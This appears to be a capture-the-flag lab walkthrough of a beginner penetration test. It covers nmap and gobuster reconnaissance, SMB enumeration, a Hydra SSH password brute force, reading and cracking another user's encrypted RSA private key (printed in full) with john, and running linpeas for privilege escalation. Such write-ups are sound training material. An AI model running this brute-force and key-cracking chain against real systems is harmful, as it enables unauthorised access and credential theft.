@@ -1,0 +1,285 @@
+Machine IP	10.10.214.30
+
+
+Lets start off with an nmap scan to get an idea of what we are working with.
+
+Nmap
+	root@ip-10-10-199-70:~# nmap -sV -sC -sS 10.10.214.30
+	
+	 Starting Nmap 7.60 ( https://nmap.org ) at 2023-03-09 02:30 GMT
+	Nmap scan report for ip-10-10-214-30.eu-west-1.compute.internal (10.10.214.30)
+	Host is up (0.0019s latency).
+	Not shown: 994 closed ports
+	PORT     STATE SERVICE     VERSION
+	22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+	| ssh-hostkey: 
+	|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
+	|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
+	|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (EdDSA)
+	80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
+	|_http-server-header: Apache/2.4.18 (Ubuntu)
+	|_http-title: Site doesn't have a title (text/html).
+	139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+	445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+	8009/tcp open  ajp13?
+	| ajp-methods: 
+	|_  Supported methods: GET HEAD POST OPTIONS
+	8080/tcp open  http-proxy
+	| fingerprint-strings: 
+	|   JavaRMI, NotesRPC: 
+	|     HTTP/1.1 400 
+	|     Content-Type: text/html;charset=utf-8
+	|     Content-Language: en
+	|     Content-Length: 2243
+	|     Date: Thu, 09 Mar 2023 02:32:24 GMT
+	|     Connection: close
+	|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
+	|_    Request</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><bod
+	|_http-favicon: Apache Tomcat
+	|_http-title: Apache Tomcat/9.0.7
+	1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+	SF-Port8080-TCP:V=7.60%I=7%D=3/9%Time=64094538%P=x86_64-pc-linux-gnu%r(Not
+	SF:esRPC,95F,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset=u
+	SF:tf-8\r\nContent-Language:\x20en\r\nContent-Length:\x202243\r\nDate:\x20
+	SF:Thu,\x2009\x20Mar\x202023\x2002:32:24\x20GMT\r\nConnection:\x20close\r\
+	SF:n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Status
+	SF:\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"text/
+	SF:css\">h1\x20{font-family:Tahoma,Arial,sans-serif;color:white;background
+	SF:-color:#525D76;font-size:22px;}\x20h2\x20{font-family:Tahoma,Arial,sans
+	SF:-serif;color:white;background-color:#525D76;font-size:16px;}\x20h3\x20{
+	SF:font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D7
+	SF:6;font-size:14px;}\x20body\x20{font-family:Tahoma,Arial,sans-serif;colo
+	SF:r:black;background-color:white;}\x20b\x20{font-family:Tahoma,Arial,sans
+	SF:-serif;color:white;background-color:#525D76;}\x20p\x20{font-family:Taho
+	SF:ma,Arial,sans-serif;background:white;color:black;font-size:12px;}\x20a\
+	SF:x20{color:black;}\x20a\.name\x20{color:black;}\x20\.line\x20{height:1px
+	SF:;background-color:#525D76;border:none;}</style></head><bod")%r(JavaRMI,
+	SF:95F,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset=utf-8\r
+	SF:\nContent-Language:\x20en\r\nContent-Length:\x202243\r\nDate:\x20Thu,\x
+	SF:2009\x20Mar\x202023\x2002:32:24\x20GMT\r\nConnection:\x20close\r\n\r\n<
+	SF:!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Status\x2040
+	SF:0\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"text/css\">
+	SF:h1\x20{font-family:Tahoma,Arial,sans-serif;color:white;background-color
+	SF::#525D76;font-size:22px;}\x20h2\x20{font-family:Tahoma,Arial,sans-serif
+	SF:;color:white;background-color:#525D76;font-size:16px;}\x20h3\x20{font-f
+	SF:amily:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font
+	SF:-size:14px;}\x20body\x20{font-family:Tahoma,Arial,sans-serif;color:blac
+	SF:k;background-color:white;}\x20b\x20{font-family:Tahoma,Arial,sans-serif
+	SF:;color:white;background-color:#525D76;}\x20p\x20{font-family:Tahoma,Ari
+	SF:al,sans-serif;background:white;color:black;font-size:12px;}\x20a\x20{co
+	SF:lor:black;}\x20a\.name\x20{color:black;}\x20\.line\x20{height:1px;backg
+	SF:round-color:#525D76;border:none;}</style></head><bod");
+	MAC Address: 02:F3:2E:58:9A:3B (Unknown)
+	Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+	
+	Host script results:
+	|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+	| smb-os-discovery: 
+	|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+	|   Computer name: basic2
+	|   NetBIOS computer name: BASIC2\x00
+	|   Domain name: \x00
+	|   FQDN: basic2
+	|_  System time: 2023-03-08T21:32:25-05:00
+	| smb-security-mode: 
+	|   account_used: guest
+	|   authentication_level: user
+	|   challenge_response: supported
+	|_  message_signing: disabled (dangerous, but default)
+	| smb2-security-mode: 
+	|   2.02: 
+	|_    Message signing enabled but not required
+	| smb2-time: 
+	|   date: 2023-03-09 02:32:25
+	|_  start_date: 1600-12-31 23:58:45
+	
+	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+	Nmap done: 1 IP address (1 host up) scanned in 130.09 seconds
+	
+	
+Next we gobuster 10.10.214.30 to try to find some secrets 
+
+	root@ip-10-10-199-70:~# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.214.30
+	===============================================================
+	Gobuster v3.0.1
+	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+	===============================================================
+	[+] Url:            http://10.10.214.30
+	[+] Threads:        10
+	[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+	[+] Status codes:   200,204,301,302,307,401,403
+	[+] User Agent:     gobuster/3.0.1
+	[+] Timeout:        10s
+	===============================================================
+	2023/03/09 03:17:53 Starting gobuster
+	===============================================================
+	/development (Status: 301)
+	===============================================================
+	2023/03/09 03:18:04 Finished
+	===============================================================
+	
+gobuster found the hidden directory "/development"
+When we traverse to that directory with "10.10.214.30/development" we see a few files that tell us version 2.5.12 of strut is being used along with Apache, and that "-J" has a weak password!
+
+We can then use enum4linux to enumerate the SMB server we found.
+	
+	root@ip-10-10-199-70:~# enum4linux -a 10.10.214.30
+	
+	|    Share Enumeration on 10.10.214.30    |
+	 ========================================= 
+	WARNING: The "syslog" option is deprecated
+	
+		Sharename       Type      Comment
+		---------       ----      -------
+		Anonymous       Disk      
+		IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
+	Reconnecting with SMB1 for workgroup listing.
+	
+		Server               Comment
+		---------            -------
+	
+		Workgroup            Master
+		---------            -------
+		WORKGROUP            BASIC2
+	
+	[+] Attempting to map shares on 10.10.214.30
+	//10.10.214.30/Anonymous	Mapping: OK, Listing: OK
+	//10.10.214.30/IPC$	[E] Can't understand response:
+	WARNING: The "syslog" option is deprecated
+	NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+	
+Hydra giveth
+	
+	root@ip-10-10-199-70:~# hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.214.30
+	Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+	
+	Hydra (http://www.thc.org/thc-hydra) starting at 2023-03-09 03:53:32
+	[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+	[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+	[DATA] attacking ssh://10.10.214.30:22/
+	[STATUS] 271.00 tries/min, 271 tries in 00:01h, 14344127 to do in 882:11h, 16 active
+	[STATUS] 250.00 tries/min, 750 tries in 00:03h, 14343652 to do in 956:15h, 16 active
+	[22][ssh] host: 10.10.214.30   login: jan   password: armando
+	
+Once in, ls returns no files. "cd .." puts us in the hjome directory where we see the other user kay. Using "ls -la" in the "kay" directory shows us a file named "pass.bak" which is likely what we are after, but do not have access yet. We also see a directory ".ssh". In that directory we have find id_rsa, and we can "cat" it.
+	-----BEGIN RSA PRIVATE KEY-----
+	Proc-Type: 4,ENCRYPTED
+	DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75
+	
+	IoNb/J0q2Pd56EZ23oAaJxLvhuSZ1crRr4ONGUAnKcRxg3+9vn6xcujpzUDuUtlZ
+	o9dyIEJB4wUZTueBPsmb487RdFVkTOVQrVHty1K2aLy2Lka2Cnfjz8Llv+FMadsN
+	XRvjw/HRiGcXPY8B7nsA1eiPYrPZHIH3QOFIYlSPMYv79RC65i6frkDSvxXzbdfX
+	AkAN+3T5FU49AEVKBJtZnLTEBw31mxjv0lLXAqIaX5QfeXMacIQOUWCHATlpVXmN
+	lG4BaG7cVXs1AmPieflx7uN4RuB9NZS4Zp0lplbCb4UEawX0Tt+VKd6kzh+Bk0aU
+	hWQJCdnb/U+dRasu3oxqyklKU2dPseU7rlvPAqa6y+ogK/woTbnTrkRngKqLQxMl
+	lIWZye4yrLETfc275hzVVYh6FkLgtOfaly0bMqGIrM+eWVoXOrZPBlv8iyNTDdDE
+	3jRjqbOGlPs01hAWKIRxUPaEr18lcZ+OlY00Vw2oNL2xKUgtQpV2jwH04yGdXbfJ
+	LYWlXxnJJpVMhKC6a75pe4ZVxfmMt0QcK4oKO1aRGMqLFNwaPxJYV6HauUoVExN7
+	bUpo+eLYVs5mo5tbpWDhi0NRfnGP1t6bn7Tvb77ACayGzHdLpIAqZmv/0hwRTnrb
+	RVhY1CUf7xGNmbmzYHzNEwMppE2i8mFSaVFCJEC3cDgn5TvQUXfh6CJJRVrhdxVy
+	VqVjsot+CzF7mbWm5nFsTPPlOnndC6JmrUEUjeIbLzBcW6bX5s+b95eFeceWMmVe
+	B0WhqnPtDtVtg3sFdjxp0hgGXqK4bAMBnM4chFcK7RpvCRjsKyWYVEDJMYvc87Z0
+	ysvOpVn9WnFOUdON+U4pYP6PmNU4Zd2QekNIWYEXZIZMyypuGCFdA0SARf6/kKwG
+	oHOACCK3ihAQKKbO+SflgXBaHXb6k0ocMQAWIOxYJunPKN8bzzlQLJs1JrZXibhl
+	VaPeV7X25NaUyu5u4bgtFhb/f8aBKbel4XlWR+4HxbotpJx6RVByEPZ/kViOq3S1
+	GpwHSRZon320xA4hOPkcG66JDyHlS6B328uViI6Da6frYiOnA4TEjJTPO5RpcSEK
+	QKIg65gICbpcWj1U4I9mEHZeHc0r2lyufZbnfYUr0qCVo8+mS8X75seeoNz8auQL
+	4DI4IXITq5saCHP4y/ntmz1A3Q0FNjZXAqdFK/hTAdhMQ5diGXnNw3tbmD8wGveG
+	VfNSaExXeZA39jOgm3VboN6cAXpz124Kj0bEwzxCBzWKi0CPHFLYuMoDeLqP/NIk
+	oSXloJc8aZemIl5RAH5gDCLT4k67wei9j/JQ6zLUT0vSmLono1IiFdsMO4nUnyJ3
+	z+3XTDtZoUl5NiY4JjCPLhTNNjAlqnpcOaqad7gV3RD/asml2L2kB0UT8PrTtt+S
+	baXKPFH0dHmownGmDatJP+eMrc6S896+HAXvcvPxlKNtI7+jsNTwuPBCNtSFvo19
+	l9+xxd55YTVo1Y8RMwjopzx7h8oRt7U+Y9N/BVtbt+XzmYLnu+3qOq4W2qOynM2P
+	nZjVPpeh+8DBoucB5bfXsiSkNxNYsCED4lspxUE4uMS3yXBpZ/44SyY8KEzrAzaI
+	fn2nnjwQ1U2FaJwNtMN5OIshONDEABf9Ilaq46LSGpMRahNNXwzozh+/LGFQmGjI
+	I/zN/2KspUeW/5mqWwvFiK8QU38m7M+mli5ZX76snfJE9suva3ehHP2AeN5hWDMw
+	X+CuDSIXPo10RDX+OmmoExMQn5xc3LVtZ1RKNqono7fA21CzuCmXI2j/LtmYwZEL
+	OScgwNTLqpB6SfLDj5cFA5cdZLaXL1t7XDRzWggSnCt+6CxszEndyUOlri9EZ8XX
+	oHhZ45rgACPHcdWcrKCBfOQS01hJq9nSJe2W403lJmsx/U3YLauUaVgrHkFoejnx
+	CNpUtuhHcVQssR9cUi5it5toZ+iiDfLoyb+f82Y0wN5Tb6PTd/onVDtskIlfE731
+	DwOy3Zfl0l1FL6ag0iVwTrPBl1GGQoXf4wMbwv9bDF0Zp/6uatViV1dHeqPD8Otj
+	Vxfx9bkDezp2Ql2yohUeKBDu+7dYU9k5Ng0SQAk7JJeokD7/m5i8cFwq/g5VQa8r
+	sGsOxQ5Mr3mKf1n/w6PnBWXYh7n2lL36ZNFacO1V6szMaa8/489apbbjpxhutQNu
+	Eu/lP8xQlxmmpvPsDACMtqA1IpoVl9m+a+sTRE2EyT8hZIRMiuaaoTZIV4CHuY6Q
+	3QP52kfZzjBt3ciN2AmYv205ENIJvrsacPi3PZRNlJsbGxmxOkVXdvPC5mR/pnIv
+	wrrVsgJQJoTpFRShHjQ3qSoJ/r/8/D1VCVtD4UsFZ+j1y9kXKLaT/oK491zK8nwG
+	URUvqvBhDS7cq8C5rFGJUYD79guGh3He5Y7bl+mdXKNZLMlzOnauC5bKV4i+Yuj7
+	AGIExXRIJXlwF4G0bsl5vbydM55XlnBRyof62ucYS9ecrAr4NGMggcXfYYncxMyK
+	AXDKwSwwwf/yHEwX8ggTESv5Ad+BxdeMoiAk8c1Yy1tzwdaMZSnOSyHXuVlB4Jn5
+	phQL3R8OrZETsuXxfDVKrPeaOKEE1vhEVZQXVSOHGCuiDYkCA6al6WYdI9i2+uNR
+	ogjvVVBVVZIBH+w5YJhYtrInQ7DMqAyX1YB2pmC+leRgF3yrP9a2kLAaDk9dBQcV
+	ev6cTcfzhBhyVqml1WqwDUZtROTwfl80jo8QDlq+HE0bvCB/o2FxQKYEtgfH4/UC
+	D5qrsHAK15DnhH4IXrIkPlA799CXrhWi7mF5Ji41F3O7iAEjwKh6Q/YjgPvgj8LG
+	OsCP/iugxt7u+91J7qov/RBTrO7GeyX5Lc/SW1j6T6sjKEga8m9fS10h4TErePkT
+	t/CCVLBkM22Ewao8glguHN5VtaNH0mTLnpjfNLVJCDHl0hKzi3zZmdrxhql+/WJQ
+	4eaCAHk1hUL3eseN3ZpQWRnDGAAPxH+LgPyE8Sz1it8aPuP8gZABUFjBbEFMwNYB
+	e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
+	3Jt1/ZW3XCb76R75sG5h6Q4N8gu5c/M0cdq16H9MHwpdin9OZTqO2zNxFvpuXthY
+	-----END RSA PRIVATE KEY-----
+	
+We made a file "one.key" to use the rsa key. After trying ssh we find that this rsa key is password encrypted, sojo we will play with john the ripper to try to crack it. "ssh2john.py" is probably what we are looking for.
+
+We call upon the py file with  "python ssh2john.py one.key > id_rsa.hash"
+
+Then we run john with our new hash
+	root@ip-10-10-152-208:~# john  --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+	Note: This format may emit false positives, so it will keep trying even after finding a
+	possible candidate.
+	Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
+	Use the "--format=ssh-opencl" option to force loading these as that type instead
+	Using default input encoding: UTF-8
+	Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+	Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+	Cost 2 (iteration count) is 1 for all loaded hashes
+	Will run 2 OpenMP threads
+	Press 'q' or Ctrl-C to abort, almost any other key for status
+	beeswax          (one.key)
+	
+Looks like the password for this rsa key is "beeswax"
+
+We will "chmod 600 one.key" to make sure permisions are correct for this key
+
+With this we can now ssh in to kay to see whats in the file we are after.
+	root@ip-10-10-152-208:~# ssh -i one.key kay@10.10.125.149
+	Enter passphrase for key 'one.key': 
+	Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)
+	
+	 * Documentation:  https://help.ubuntu.com
+	 * Management:     https://landscape.canonical.com
+	 * Support:        https://ubuntu.com/advantage
+	
+	0 packages can be updated.
+	0 updates are security updates.
+	
+	kay@basic2:~$ ls
+	pass.bak
+	kay@basic2:~$ cat pass.bak
+	heresareallystrongpasswordthatfollowsthepasswordpolicy$$
+	
+With that, the room is done!
+
+
+
+AFTER THOUGHTS:
+
+I wanted to get some practice with linpeas, so here we go.
+
+Since we have the password for Jan ssh, we can scp linpeas into the /dev/shm folder (it is a shared memory location).
+	(base) ┌──(christian㉿DESKTOP-PN6TE9M)-[~]
+	└─$ scp /usr/share/peass/linpeas/linpeas.sh jan@10.10.203.105:/dev/shm
+	jan@10.10.203.105's password:
+	linpeas.sh                                                                            100%  809KB 662.9KB/s   00:01
+	
+And when we check, we see linpeas is there, so we will run it!
+	jan@basic2:~$ cd /dev/shm
+	jan@basic2:/dev/shm$ ls
+	linpeas.sh
+	jan@basic2:/dev/shm$ ./linpeas.sh
+	
+Linpeas found lots, however directly pertaining to our method of entry, it did find and print the ssh key!
+	══╣ Possible private SSH keys were found!
+	/home/kay/.ssh/id_rsa
+	
+We also found some SUID privesc potential.
+
+The number of potential vulnerabilities found with linpeas is insane. What a cool tool. WAY more info than is even worth trying to type or copy paste here.
